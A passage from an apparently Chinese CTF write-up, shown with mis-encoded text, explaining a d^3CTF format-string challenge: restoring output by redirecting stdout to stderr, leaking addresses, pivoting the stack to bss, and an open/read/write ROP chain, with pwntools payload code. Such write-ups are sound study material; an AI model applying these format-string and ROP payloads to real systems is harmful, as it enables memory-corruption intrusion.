æ­¤å¹¶ä¸ä¼šè®©putså‡ºç°ä»»ä½•å›æ˜¾</strong>ã€‚</p><p>ä½†æ˜¯å¦‚æœæˆ‘ä»¬å¯ä»¥åœ¨è¿™ä¸ªè¿‡ç¨‹çš„ä¸­é—´åšæ‰‹è„šæ¯”å¦‚å°†åŸæœ¬stdoutæ‰€æŒ‡å‘çš„IO_2_1_stdoutä¿®æ”¹ä¸ºIO_2_1_stderrï¼Œç­‰ç¨‹åºæ¥å¯»æ‰¾çš„æ—¶å€™ï¼Œæœ€ç»ˆè·å–äº†æ–‡ä»¶æè¿°ç¬¦2ï¼Œç”±äºæ–‡ä»¶æè¿°ç¬¦2å¯¹åº”çš„ç»ˆç«¯ä¹Ÿæ˜¯å±å¹•ï¼Œæœ€ç»ˆæ‰§è¡ŒputsæˆåŠŸå‡ºç°äº†å›æ˜¾ã€‚</p></blockquote><p>PS:<strong>ç¨‹åºå¦‚æœæ‰§è¡Œsetvbufï¼Œstdoutä¼šå‡ºç°åœ¨bssæ®µï¼Œåä¹‹åˆ™ä¼šåœ¨libcåº“ä¸­</strong>ã€‚</p><p>å› æ­¤å½“å‰æ€è·¯å°±æ˜¯åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²å°†stdoutæ‰€æŒ‡å‘çš„IO_2_1_stdoutä¿®æ”¹ä¸ºIO_2_1_stderrï¼Œè®©ç¨‹åºå‡ºç°å›æ˜¾ã€‚ï¼ˆå¦å¤–å°±æ˜¯ä¸€ä¸ªå¤§å‘ï¼Œ<strong>å¦‚æœclose(1)å…³é—­äº†æ ‡å‡†è¾“å‡ºï¼Œé‚£ä¹ˆæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„å†™å…¥æ•°æ®æœ€å¤šåªèƒ½å†™å…¥0x2000å­—èŠ‚</strong>ï¼ˆæœ¬èœç‹—é€šè¿‡å®éªŒä»…ä»…åªå‘ç°äº†è¿™ä¸ªè§„å¾‹ï¼Œç›®å‰è¿˜ä¸çŸ¥é“åŸå› ï¼Œå¦‚æœå„ä½å¸ˆå‚…çŸ¥é“åŸå› çš„è¯ï¼Œè¿˜è¯·å‘ŠçŸ¥ï¼‰</p><h2 id="é‡å¯è¾“å‡º"><a href="#é‡å¯è¾“å‡º" class="headerlink" title="é‡å¯è¾“å‡º"></a>é‡å¯è¾“å‡º</h2><p>ç”±äºè¾“å…¥æ˜¯åœ¨bssæ®µä¸Šï¼Œè¦æ˜¯æƒ³ä¿®æ”¹æ ˆä¸­çš„æ•°æ®ï¼Œå°±è¦å»å¸ƒç½®ä¸€æ¡æ ˆé“¾ï¼ˆå…³äºæ ˆé“¾æœ¬æ–‡ä¸å†å¤šè¯´ï¼Œå…·ä½“å¯ä»¥å»çœ‹<a href="https://www.cnblogs.com/ZIKH26/articles/16167705.html">de1ctf_2019_unprintable</a>è¿™ç¯‡æ–‡ç« ï¼‰</p><p>ç„¶åé€šè¿‡æ ˆé“¾æ¥ä¿®æ”¹æ•°æ®ã€‚</p><h3 id="å¸ƒç½®æ ˆé“¾"><a href="#å¸ƒç½®æ ˆé“¾" class="headerlink" title="å¸ƒç½®æ ˆé“¾"></a>å¸ƒç½®æ ˆé“¾</h3><p><img src="/../img/2706180-20220429212323223-1540543285.png"></p><p>é¦–å…ˆå‘ç°æ ˆä¸­å­˜åœ¨bssæ®µä¸Šbufçš„åœ°å€<font color=red>ï¼ˆ<strong>è¯·æ³¨æ„åŒºåˆ†bufçš„åœ°å€ï¼Œå’ŒæŒ‡å‘bufçš„åœ°å€ï¼‰</strong></font>ï¼Œå› æ­¤æˆ‘ä»¬è¦æŠŠ0x7fffffffdf58å¸ƒç½®åˆ°æ ˆé‡Œé¢ï¼Œé€šè¿‡0x7fffffffdf58æ¥æ”¹å†™0x555555756060,å°†å…¶æ”¹å†™ä¸ºstdoutçš„åœ°å€ï¼Œç„¶åé€šè¿‡stdoutçš„åœ°å€æ¥ä¿®æ”¹libcä¸­IO_2_1_stdoutã€‚</p><p>å‘ç°è¿™é‡Œæœ‰ä¸€æ¡æ ˆé“¾ï¼ˆå¦‚ä¸‹å›¾ï¼‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ‹¿å®ƒæ¥å¼€åˆ€</p><p><img src="/../img/2706180-20220429211303720-552527412.png" alt="image-20220429120543301"></p><p>è¿™ä¸ªåç§»æ˜¯6ï¼Œå› æ­¤ç¬¬ä¸€æ¬¡è¾“å…¥payloadä¸º</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(leak) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br></pre></td></tr></table></figure><p>leakä¸ºç¨‹åºè‡ªå·±æ³„éœ²çš„åœ°å€å–æœ€åä¸€å­—èŠ‚ï¼Œé€šè¿‡è°ƒè¯•å‘ç°ç¨‹åºè‡ªå·±æ³„éœ²çš„åœ°å€å°±æ˜¯<strong>æŒ‡å‘bufçš„åœ°å€</strong>ï¼Œè€Œæˆ‘ä»¬ç°åœ¨å°±æ˜¯è¦åˆ©ç”¨æ ˆé“¾æŠŠ<strong>æŒ‡å‘bufçš„åœ°å€</strong>å†™åˆ°æ ˆé‡Œã€‚</p><p>ä¸‹å›¾ä¸ºä¿®æ”¹å‰ï¼š</p><p><img src="/../img/2706180-20220429211303321-1767973157.png" alt="image-20220429120948542"></p><p>ä¸‹å›¾ä¸ºä¿®æ”¹åï¼š</p><p><img src="/../img/2706180-20220429211302412-550468177.png" alt="image-20220429121046146"></p><p>ä¸‹ä¸€æ­¥ï¼Œé€šè¿‡æŒ‡å‘bufçš„åœ°å€æ¥ä¿®æ”¹bufåœ°å€ï¼Œå°†å…¶ä¿®æ”¹ä¸ºstdoutçš„å€¼ï¼Œä¹Ÿå°±æ˜¯é€šè¿‡ä¸‹å›¾æ¥è¿›è¡Œä¿®æ”¹</p><p><img src="/../img/2706180-20220429211301712-926818635.png" alt="image-20220429131219657"></p><p>ç”±å›¾å¯çŸ¥ï¼Œåç§»å–10ï¼ˆè€ƒè™‘å…­ä¸ªå¯„å­˜å™¨ï¼‰ï¼Œpayloadå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x20</span>) + <span class="string">&#x27;c%10$hhn&#x27;</span></span><br></pre></td></tr></table></figure><p>ä¿®æ”¹å‰ï¼š</p><p><img src="/../img/2706180-20220429212347424-250445275.png"></p><p>ä¿®æ”¹åï¼š</p><p><img src="/../img/2706180-20220429211301359-1998268975.png" alt="image-20220429131503421"></p><p>æ­¤æ—¶bufå·²ç»è¢«ä¿®æ”¹æˆäº†stdoutçš„å€¼ï¼Œå¯ä»¥çœ‹åˆ°stdoutæŒ‡å‘äº†IO_2_1_stdoutã€‚</p><h3 id="ä¿®æ”¹IO-2-1-stdout"><a href="#ä¿®æ”¹IO-2-1-stdout" class="headerlink" title="ä¿®æ”¹IO_2_1_stdout"></a>ä¿®æ”¹IO_2_1_stdout</h3><p>æœ€åé€šè¿‡stdoutå°†IO_2_1_stdoutæ”¹ä¸ºIO_2_1_stderrå³å¯ã€‚</p><p>IO_2_1_stderrçš„åç§»å»libcä¸­æ‰¾ï¼ˆå¦‚ä¸‹å›¾ï¼‰ï¼Œç”±äºæœ€ååç§»åªæ˜¯æœ€åä¸€ä¸ªåŠå­—èŠ‚ä¸åŒï¼Œä½†æ˜¯åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²è¦ä¹ˆä¿®æ”¹ä¸€å­—èŠ‚è¦ä¹ˆä¿®æ”¹ä¸¤å­—èŠ‚ï¼Œå› æ­¤è¿™é‡Œæˆ‘ä»¬é‡‡ç”¨ä¿®æ”¹åä¸¤å­—èŠ‚ï¼Œå³çˆ†ç ´å€’æ•°ç¬¬å››ä½ï¼ˆæˆ‘ä»¬é‡‡ç”¨hnå†™å…¥ï¼Œä½†æ˜¯å¯¹åç§»å–&amp;0xfffï¼Œå› æ­¤æˆ‘ä»¬ä¸€ç›´åœ¨çˆ†ç ´æˆåŠŸçš„æ¡ä»¶å°±æ˜¯libcåŸºåœ°å€å€’æ•°ç¬¬å››ä½ä¸º0æ—¶ï¼‰</p><p><img src="/../img/2706180-20220429211300471-55201055.png" alt="image-20220429132536061"></p><p>è¿™é‡Œçš„payloadä¸º</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(stderr) + <span class="string">&#x27;c%9$hn&#x27;</span></span><br></pre></td></tr></table></figure><p>stderrä¸ºIO_2_1_stderråœ°å€æœ€åä¸‰ä½</p><p>ç”±äºè¿™é‡Œæ˜¯éœ€è¦çˆ†ç ´çš„ï¼Œå¦‚æœçˆ†ç ´ä¸æˆåŠŸå°±æ„å‘³ç€ä¿®æ”¹å¤±è´¥ï¼Œåˆ™ç¨‹åºä¾ç„¶ä¸ä¼šç»™å›æ˜¾ï¼Œå› æ­¤æˆ‘ä»¬é€šè¿‡ç¨‹åºæ˜¯å¦æœ‰å›æ˜¾æ¥åˆ¤æ–­,å¦‚æœæœ‰å›æ˜¾çš„è¯ï¼Œæˆ‘ä»¬å‘è¿‡å»çš„aaaaaè‚¯å®šæ˜¯å¯ä»¥è¢«æ¥æ”¶çš„ï¼Œå¦åˆ™åˆ™è¿”å›å½“å‰å‡½æ•°ï¼Œç»§ç»­çˆ†ç ´ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.sendline(<span class="string">&#x27;aaaaaaa&#x27;</span>)</span><br><span class="line">    x = p.recvuntil(<span class="string">&#x27;aa&#x27;</span>, timeout=<span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;aa&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> x:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;fail&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;success-----------------------------------------&#x27;</span>)</span><br></pre></td></tr></table></figure><p>ä¸‹é¢ä¸ºçˆ†ç ´æˆåŠŸä¿®æ”¹stdoutçš„æƒ…å†µï¼Œå¯ä»¥çœ‹åˆ°æ­¤æ—¶çš„stdoutå·²ç»æŒ‡å‘äº†IO_2_1_stderr</p><p><img src="/../img/2706180-20220429211259662-1580436394.png" alt="image-20220429135139870"></p><p>è‡³æ­¤æˆ‘ä»¬çš„è¾“å‡ºå·²ç»è¢«é‡å¯ï¼Œé‚£å‰©ä¸‹çš„å°±éšä¾¿ç©äº†ã€‚</p><h2 id="æ³„éœ²æ•°æ®"><a href="#æ³„éœ²æ•°æ®" class="headerlink" title="æ³„éœ²æ•°æ®"></a>æ³„éœ²æ•°æ®</h2><p>ç”±äºæ¥ä¸‹æ¥è¦å¯¹æŠ—PIEä»¥åŠè¦è·å–libcï¼Œå› æ­¤æˆ‘ä»¬è¦å…ˆæ³„éœ²ä¸€ä¸‹æ ˆä¸­æ•°æ®ã€‚æˆ‘ä»¬è¦è·å–æ ˆåŸºåœ°å€ï¼ŒlibcåŸºåœ°å€ï¼Œç¨‹åºåŸºåœ°å€ï¼Œè§‚å¯Ÿæ ˆé‡Œæƒ…å†µï¼ˆå¦‚ä¸‹å›¾ï¼‰</p><p><img src="/../img/2706180-20220429212431241-1139249530.png"></p><p>å¦‚æœæ­¤æ—¶ç›´æ¥å‘é€payloadä¼šå‘ç°åé—¨çš„æ•°æ®éƒ½è¿åŒ…äº†ï¼Œå¦‚æœæ¯æ¬¡sendlineä¹‹å‰éƒ½æ‰“ä¸Špause()ï¼Œé‚£ä¹ˆåœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ‰§è¡Œçš„æ—¶å€™è¦ä½ æŠŠæ‰€æœ‰çš„sendlineå…¨å‘äº†æ‰èƒ½å»æ‰§è¡Œï¼Œå¦‚æœå…¨å‘çš„è¯ä¼šè¿åŒ…â€¦ ï¼ˆè¿™é‡Œè¡¥å……ä¸€ä¸ªå¾ˆç»†çš„æŠ€å·§ï¼Œæ¯æ¬¡å‘é€æ•°æ®æ—¶ï¼ŒæŠŠpayloadç»™å¡«æ»¡ï¼Œè¿™æ ·å°±å¯ä»¥é¿å…è¿åŒ…çš„äº§ç”Ÿï¼‰ï¼Œpayloadå¦‚ä¸‹ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%19$p%15$p%6$p&#x27;</span></span><br><span class="line">p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure><h2 id="ä¿®æ”¹è¿”å›åœ°å€"><a href="#ä¿®æ”¹è¿”å›åœ°å€" class="headerlink" title="ä¿®æ”¹è¿”å›åœ°å€"></a>ä¿®æ”¹è¿”å›åœ°å€</h2><p>å› ä¸ºæœ€åçš„æ ¸å¿ƒæ˜¯åœ¨bssæ®µå¸ƒç½®ropé“¾ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æŠŠæ ˆç»™è¿ç§»åˆ°bssæ®µã€‚å¤§è‡´æ€è·¯æ˜¯å°†è¿”å›åœ°å€æ”¹å†™æˆpop rspåœ°å€ï¼Œè€ŒæŠŠè¿”å›åœ°å€ä¸‹é¢çš„å†…å®¹æ”¹æˆè¦è¿ç§»çš„bssæ®µåœ°å€ï¼Œæœ€åæ‰§è¡Œpop rspçš„æ—¶å€™å°±å®Œæˆäº†è¿ç§»ï¼Œæœ€ç»ˆæ‰§è¡Œæˆ‘ä»¬å¸ƒç½®åœ¨bssæ®µä¸Šropé“¾ã€‚</p><p>å…ˆè¯´ä¿®æ”¹è¿”å›åœ°å€ã€‚</p><p><img src="/../img/2706180-20220429211258718-1324186526.png" alt="image-20220429145805076"></p><p>åªéœ€è¦æ‹¿pop rspçš„åœ°å€åŠ ä¸Šç¨‹åºåŸºåœ°å€çš„åç§»ï¼Œç„¶åå–åä¸¤å­—èŠ‚å°±okäº†ã€‚ä¸è¿‡é€šè¿‡è§‚å¯Ÿå½“å‰æ ˆå‘ç°ï¼Œä¾æ—§æ˜¯éœ€è¦æ ˆé“¾æ¥ä¿®æ”¹è¿”å›åœ°å€ï¼Œå› ä¸ºæ²¡æœ‰æ ˆçš„å†…å®¹æŒ‡å‘äº†è¿”å›åœ°å€ï¼ˆå¦‚ä¸‹å›¾ï¼‰</p><p><img src="/../img/2706180-20220429211258315-666625238.png" alt="image-20220429200013595"></p><p>å°†æ ˆé¡¶å†…å­˜å•å…ƒæŒ‡å‘çš„0x7ffe8cfa5578æ”¹æˆ0x7ffe8cfa5588ï¼ˆå¦‚ä¸‹å›¾ï¼‰ï¼Œè¿™æ­¥çš„ç›®çš„æ˜¯é€šè¿‡0x7ffe8cfa5588æ¥ä¿®æ”¹menuçš„è¿”å›åœ°å€ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(hook1) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹åï¼š</p><p><img src="/../img/2706180-20220429211257019-882261517.png" alt="image-20220429184528636"></p><p>ç„¶åå°†menuå‡½æ•°çš„è¿”å›åœ°å€ä¿®æ”¹æˆpop rsp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(rsp_addr) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure><p>ä¸‹å›¾ä¸ºä¿®æ”¹åï¼š</p><p><img src="/../img/2706180-20220429211254572-26405026.png" alt="image-20220429201250680"></p><p>æ­¤æ—¶è¿”å›åœ°å€å·²ç»ä¿®æ”¹å®Œæˆï¼Œæœ€åä¸¤æ­¥åˆ†åˆ«æ˜¯å¸ƒç½®è¿ç§»åœ°å€å’Œæ„é€ ropé“¾ï¼Œå…ˆè¯´å¸ƒç½®è¿ç§»åœ°å€ã€‚</p><h2 id="å¸ƒç½®è¿ç§»åœ°å€"><a href="#å¸ƒç½®è¿ç§»åœ°å€" class="headerlink" title="å¸ƒç½®è¿ç§»åœ°å€"></a>å¸ƒç½®è¿ç§»åœ°å€</h2><p>è¿™ä¸ªè¿‡ç¨‹å’Œ<a href="https://www.cnblogs.com/ZIKH26/articles/16167705.html">de1ctf_2019_unprintable</a>ä¸€æ¨¡ä¸€æ ·ï¼ˆåŸç†åœ¨è¿™ç¯‡æ–‡ç« ä¸­å·²ç»è§£é‡Šï¼‰ï¼Œå°±ä¸å†è§£é‡ŠåŸç†äº†ï¼Œç›´æ¥æ”¾è¿™éƒ¨åˆ†è„šæœ¬äº†</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å¸ƒç½®è¿ç§»åœ°å€bss_addr+0x10  å› ä¸ºbssè¦å­˜æ”¾d^3CTF and flag</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss_hook1-------------&gt;&quot;</span>, <span class="built_in">hex</span>(bss_hook))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_hook &amp; <span class="number">0xffff</span>)) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    bss_addr = base_addr + <span class="number">0x202060</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss1_addr-------------&gt;&quot;</span>, <span class="built_in">hex</span>(bss_addr &amp; <span class="number">0xffff</span>))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_addr + <span class="number">0x10</span>) &amp; <span class="number">0xffff</span>) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    bss_hook = bss_hook + <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;bss_hook2--------------&gt;&#x27;</span>, <span class="built_in">hex</span>(bss_hook))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_hook &amp; <span class="number">0xffff</span>)) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss2_addr-------------&gt;&quot;</span>, <span class="built_in">hex</span>((bss_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(((bss_addr) &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    bss_hook = bss_hook + <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;bss_hook3--------------&gt;&#x27;</span>, <span class="built_in">hex</span>(bss_hook))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_hook &amp; <span class="number">0xffff</span>)) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss2_addr-------------&gt;&quot;</span>, <span class="built_in">hex</span>((bss_addr &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffff</span>))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(((bss_addr) &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffff</span>) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="å¸ƒç½®ropé“¾"><a href="#å¸ƒç½®ropé“¾" class="headerlink" title="å¸ƒç½®ropé“¾"></a>å¸ƒç½®ropé“¾</h2><p>é¦–å…ˆè¦è§¦å‘pop rspï¼Œè‚¯å®šæ˜¯è¦ç»“æŸå¾ªç¯ï¼Œå› æ­¤æˆ‘ä»¬è¾“å…¥çš„payloadæœ€å¼€å§‹è¦å­˜æ”¾å­—ç¬¦ä¸²d^3CTFï¼ŒåŒæ—¶æˆ‘ä»¬è¦é‡‡ç”¨orwï¼Œopençš„flagå­—ç¬¦ä¸²ä¹Ÿè¦å­˜å…¥ã€‚æ‰€ä»¥d^3CTFåé¢å†å†™ä¸ªflagå­—ç¬¦ä¸²ã€‚åˆå› ä¸ºæœ€å¼€å§‹çš„pop rspåé¢è¿˜æœ‰pop r13;pop r14;pop r15ï¼Œå› æ­¤åœ¨å­—ç¬¦ä¸²åé¢å¡«å…¥24å­—èŠ‚çš„åƒåœ¾æ•°æ®ï¼ˆä¸ºäº†é¿å…å°†å­—ç¬¦ä¸²å¼¹å…¥å¯„å­˜å™¨ï¼Œæˆ‘ä»¬è¿ç§»çš„åœ°å€å«é«˜0x10å­—èŠ‚ï¼‰</p><p>è‡³æ­¤å¼€å§‹æ­£å¼å¸ƒç½®ropé“¾ï¼Œè¿™é‡Œè¯´ä¸€ä¸‹ï¼Œæˆ‘æœ€å¼€å§‹ç”¨çš„æ˜¯mprotectå‡½æ•°æ”¹å†™bssæ®µå±æ€§ï¼Œæœ€åæœ¬åœ°è·å–äº†flagï¼Œä½†æ˜¯è¿œç¨‹æ²¡æœ‰æ˜¾ç¤ºflagï¼ˆä½†æ˜¯è„šæœ¬å†™çš„æ˜¯æ²¡é—®é¢˜çš„ï¼Œè¿œç¨‹ä¸é€šæ˜¯ä¸ªæœªè§£ä¹‹è°œâ€¦è¿™ä¸ªè„šæœ¬æˆ‘æ”¾åˆ°æ–‡æœ«äº†ï¼‰</p><p>mprotectè¡Œä¸é€šï¼Œé‚£å°±é‡‡ç”¨ä¼ ç»Ÿæ–¹å¼ï¼Œä¼ å‚ç„¶åæ‰§è¡Œå‡½æ•°ã€‚</p><p>æˆ‘ä»¬æ¥ä¸‹æ¥å°±æ˜¯è¦æ‰§è¡Œä¸‹é¢çš„å†…å®¹ï¼Œå€¼å¾—ä¸€æçš„æ˜¯ç”±äºcloseå…³é—­äº†æ–‡ä»¶æè¿°ç¬¦1ï¼Œå› æ­¤openè¿”å›çš„æ–‡ä»¶æè¿°ç¬¦æ˜¯1ï¼ˆæ–‡ä»¶æè¿°ç¬¦æ˜¯å–å½“å‰å¯ç”¨æ–‡ä»¶æè¿°ç¬¦çš„æœ€å°çš„é‚£ä¸€ä¸ªï¼Œæ­¤æ—¶0,2è¢«å ç”¨ï¼Œå› æ­¤1æ˜¯æœ€å°ï¼‰ï¼ŒåŒæ—¶ç”±äºstdoutæŒ‡å‘äº†IO_2_1_stderr,æ‰€ä»¥æˆ‘ä»¬åº”è¯¥ä½¿ç”¨æ–‡ä»¶æè¿°ç¬¦2è¿›è¡Œè¾“å‡ºã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">open</span>(flag_addr,<span class="number">0</span>)</span><br><span class="line">read(<span class="number">1</span>,base_addr+<span class="number">0x202060</span>+<span class="number">0x300</span>,<span class="number">0x100</span>)</span><br><span class="line">write(<span class="number">2</span>,base_addr+<span class="number">0x202060</span>+<span class="number">0x300</span>,<span class="number">0x100</span>)</span><br></pre></td></tr></table></figure><p>è‡³äºä¼ å‚ä¹‹ç±»æ‰€éœ€è¦çš„gadgetï¼Œç”¨å•¥å°±å»libcåº“é‡Œæ‰¾ï¼ˆå› ä¸ºç°åœ¨libcåŸºåœ°å€æ˜¯çŸ¥é“çš„ï¼‰ï¼Œlibcé‡Œå•¥éƒ½æœ‰ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;d^3CTF\x00\x00&#x27;</span></span><br><span class="line">   payload += <span class="string">&#x27;flag\x00\x00\x00\x00&#x27;</span></span><br><span class="line">   payload += p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">   <span class="comment"># open(flag_addr,0)</span></span><br><span class="line">   payload += p64(pop_rdi_addr) + p64(base_addr + <span class="number">0x202068</span>)</span><br><span class="line">   payload += p64(pop_rsi_r15_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">   payload += p64(open_addr)</span><br><span class="line"></span><br><span class="line">   <span class="comment"># read(1,base_addr+0x202060+0x300,0x100)</span></span><br><span class="line">   payload += p64(pop_rdi_addr) + p64(<span class="number">1</span>)</span><br><span class="line">   payload += p64(pop_rsi_r15_addr) + p64(base_addr + <span class="number">0x202060</span> + <span class="number">0x300</span>) + p64(<span class="number">0</span>)</span><br><span class="line">   payload += p64(pop_rdx_addr) + p64(<span class="number">0x100</span>)</span><br><span class="line">   payload += p64(read_addr)</span><br><span class="line"></span><br><span class="line">   <span class="comment"># write(2,base_addr+0x202060+0x300,0x100)</span></span><br><span class="line">   payload += p64(pop_rdi_addr) + p64(<span class="number">2</span>)</span><br><span class="line">   payload += p64(pop_rsi_r15_addr) + p64(base_addr + <span class="number">0x202060</span> + <span class="number">0x300</span>) + p64(<span class="number">0</span>)</span><br><span class="line">   payload += p64(pop_rdx_addr) + p64(<span class="number">0x100</span>)</span><br><span class="line">   payload += p64(write_addr)</span><br><span class="line">   p.sendline(payload)</span><br><span class="line">   p.interactive()</span><br></pre></td></tr></table></figure><h1 id="expï¼š"><a href="#expï¼š" class="headerlink" title="expï¼š"></a>expï¼š</h1><h2 id="1ã€è·å–libcåŸºåœ°å€ï¼Œç”¨libcåº“é‡Œçš„gadgetæ‰§è¡Œorwè·å–flag"><a href="#1ã€è·å–libcåŸºåœ°å€ï¼Œç”¨libcåº“é‡Œçš„gadgetæ‰§è¡Œorwè·å–flag" class="headerlink" title="1ã€è·å–libcåŸºåœ°å€ï¼Œç”¨libcåº“é‡Œçš„gadgetæ‰§è¡Œorwè·å–flag"></a>1ã€è·å–libcåŸºåœ°å€ï¼Œç”¨libcåº“é‡Œçš„gadgetæ‰§è¡Œorwè·å–flag</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># from pwncli import *</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    io_stderr_addr = libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;io_stderr_addr------------&gt;&#x27;</span>, <span class="built_in">hex</span>(io_stderr_addr))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">    print_ret_addr = leak_addr - <span class="number">0x20</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;print_ret_addr--------&gt;&#x27;</span>, <span class="built_in">hex</span>(print_ret_addr))</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;æ„é€ æ ˆé“¾ï¼Œç¬¬ä¸€æ¬¡æ„é€ ä¸€ä¸ªæŒ‡å‘bufçš„æ ˆåœ°å€&#x27;&#x27;&#x27;</span></span><br><span class="line">    leak = (leak_addr) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(leak))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(leak) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    rsp_addr = <span 